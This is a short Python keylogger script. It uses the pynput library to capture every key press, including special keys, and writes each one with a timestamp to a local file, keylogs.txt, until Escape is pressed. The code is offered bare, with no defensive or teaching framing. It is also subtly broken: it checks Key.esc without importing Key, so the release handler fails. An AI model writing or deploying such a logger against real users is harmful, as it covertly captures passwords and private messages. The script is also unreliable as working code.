from pynput.keyboard import Listener
import logging

# Set up logging to a file
logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        # Capture the key pressed and log it
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Handle special keys
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    # Stop listener on pressing the escape key
    if key == Key.esc:
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
